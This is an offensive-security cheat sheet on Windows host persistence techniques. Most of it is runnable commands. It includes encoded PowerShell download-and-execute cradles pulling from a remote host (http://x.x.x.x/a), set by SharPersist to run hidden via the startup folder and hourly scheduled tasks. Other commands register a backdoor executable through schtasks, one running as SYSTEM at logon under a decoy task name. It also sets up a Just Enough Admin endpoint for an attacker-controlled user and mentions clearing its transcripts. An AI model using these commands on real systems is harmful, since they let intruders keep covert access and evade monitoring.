* [User land](#User-land)
  * [Startup](#Startup)
  * [Registery keys](#Registery keys)
  * [LNK](#LNK)
  * [Schtask](#sSchtasks)
* [Elevated](#Elevated)
  * [Schtasks](#Schtasks2)
  * [Just Enough Admin](#Just-Enough-Admin)

## Host Persistence
### Userland
### Startup
- Batch script inside user directory ```$env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup\'```

#### Startup folder sharpersist.exe
- Download an execute cradle as persistence
```
str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -f "UserEnvSetup" -m add
```

### Registery keys
- https://attack.mitre.org/techniques/T1060/

#### Registery sharpersist.exe
- ```-k``` is the registry key to modify.
- ```-v``` is the name of the registry key to create.
```
SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

### LNK
- Modify links to execute arbritary code
- https://github.com/HarmJ0y/Misc-PowerShell/blob/master/BackdoorLNK.ps1

### Schtasks
```
# Daily at 10:00
schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc daily /st 10:00

# Run a task each time the user's sessions is idle for 10 minutes
schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc onidle /i 10
```

##### schtask sharpersist.exe
- Download an execute cradle as persistence
```
str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -n "Updater" -m add -o hourly
```

#### Microsoft Office Trusted Locations
- Allow DLL or macros to execute despite the configured security settings (Ignored if macro's or add-ins have been blocked by GPO)
- Create a new Excel document with a module containing the persistence mechanism. Save it as "Excel Add-in" inside ```%APPDATA%\Microsoft\Excel\XLSTART``` and it will be launched every tim the user opens MS Excel application.
- https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/

## Elevated
### Schtasks2
```
# Run task as system each time a user logs in
schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "NotEvil" /tr C:\backdoor.exe /sc onlogon
```

### Just Enough Admin
- If we have admin privileges on a machine, we can create a JEA endpoint which allows all commands to a user we control.
- With this capability, it is also possible to clear the transcripts for this endpoint. 

#### Create a new JEA endpoint
- https://github.com/samratashok/RACE

```
Set-JEAPermissions -ComputerName ops-dc -SamAccountName <USER> -Verbose
```

#### Connect to JEA endpoint
```
Enter-PSSession -ComputerName ops-dc -ConfigurationName microsoft.powershell64
```
